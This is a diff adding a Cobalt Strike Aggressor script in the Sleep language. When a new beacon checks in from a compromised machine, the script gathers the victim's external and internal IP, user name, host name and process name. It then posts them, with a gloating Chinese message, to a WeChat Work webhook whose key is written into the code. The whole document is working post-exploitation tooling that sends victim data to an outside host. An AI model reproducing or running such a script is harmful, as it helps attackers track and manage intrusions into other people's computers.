@@ -1,0 +1,39 @@
+sub http_post {
+        local('$output');
+        $url = [new java.net.URL: $1];
+        $conn = [$url openConnection];
+        [$conn setRequestMethod: "POST"];
+        [$conn setDoOutput: true];
+        [$conn setRequestProperty: "Content-Length", strlen($2)];
+
+        [$conn setRequestProperty: "Content-Type", "application/json;charset=UTF-8"];
+
+        $outStream = [$conn getOutputStream];
+        [$outStream write: [$2 getBytes]];
+
+        $inStream = [$conn getInputStream];
+        $handle = [SleepUtils getIOHandle: $inStream, $outStream];
+        @content = readAll($handle);
+        return @content;
+    }
+
+on beacon_initial {
+    
+    $url = 'https://qyapi.weixin.qq.com/cgi-bin/webhook/send?key=36f26ddb-0dc8-4f96-91b0-848b56c90723';
+
+    $externalIP = replace(beacon_info($1,"external")," ","_");
+    $internalIP = replace(beacon_info($1, "internal")," ","_");
+    $userName = replace(beacon_info($1,"user")," ","_");
+    $computerName = replace(beacon_info($1,"computer")," ","_");
+    $processName = replace(beacon_info($1,"process")," ","_");
+    $msg = '# <font color=\"warning\">[82]哈哈，TMD终于上线了</font>'.
+'\n>## 外部IP : \n<font color=\"red\">'.$externalIP.
+'</font>\n>## 内网IP : \n<font color=\"red\">'.$internalIP.
+'</font>\n>## 进程名 : \n<font color=\"red\">'.$processName.
+'</font>\n>## 用户名 : \n<font color=\"red\">'.$userName.
+'</font>\n>## 主机名 : \n<font color=\"red\">'.$computerName.'</font>';
+    $payload = '{"msgtype":"markdown","markdown":{"content":"'.$msg.'"}}';
+    println($msg);
+    http_post($url,$payload)
+}
+
